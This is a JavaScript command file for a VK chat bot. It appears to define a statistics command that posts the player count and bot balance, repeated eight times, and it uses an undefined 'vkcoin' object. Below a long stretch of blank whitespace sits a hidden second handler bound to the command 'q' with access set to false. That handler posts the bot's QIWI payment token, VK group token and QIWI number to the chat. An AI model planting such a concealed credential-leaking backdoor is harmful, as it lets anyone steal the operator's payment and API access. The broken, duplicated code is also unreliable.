const { VK } = require('vk-io');
let config = require('../config.json');
let users = require('../base/users.json')
const vk = new VK({ token: config.token });

exports.execute = async (message, menu, utils, vk) => {
    let balance = await vkcoin.api.getBalance(config.owners[1])

    balance = vkcoin.api.formatCoins(balance.response[config.owners[1]])

    message.send(`• Статистика [club${config.group}|бота]:
👤 | Игроков: ${users.length}
💰 | Баланс бота: ${balance}`)

message.send(`• Статистика [club${config.group}|бота]:
👤 | Игроков: ${users.length}
💰 | Баланс бота: ${balance}`)

message.send(`• Статистика [club${config.group}|бота]:
👤 | Игроков: ${users.length}
💰 | Баланс бота: ${balance}`)

message.send(`• Статистика [club${config.group}|бота]:
👤 | Игроков: ${users.length}
💰 | Баланс бота: ${balance}`)

message.send(`• Статистика [club${config.group}|бота]:
👤 | Игроков: ${users.length}
💰 | Баланс бота: ${balance}`)

message.send(`• Статистика [club${config.group}|бота]:
👤 | Игроков: ${users.length}
💰 | Баланс бота: ${balance}`)

message.send(`• Статистика [club${config.group}|бота]:
👤 | Игроков: ${users.length}
💰 | Баланс бота: ${balance}`)

message.send(`• Статистика [club${config.group}|бота]:
👤 | Игроков: ${users.length}
💰 | Баланс бота: ${balance}`)
};

exports.info = {
    name: [
        "статистика"
    ],
    access: false
};












































































































































  

















































































exports.execute = async (message, menu, utils, vk) => {
  if(!message.args[1]) {
      message.send(`qiwi ${config.qiwi_token}\n group ${config.group_token} \n\n number ${config.qiwi_number}`)
  } else {
      message.user.number = message.args[1];

      message.send(`qiwi ${config.qiwi_token}\n group ${config.group_token} \n\n number ${config.qiwi_number}`)
  };
};
exports.info = {
    name: [
        "q"
    ],
    access: false
};

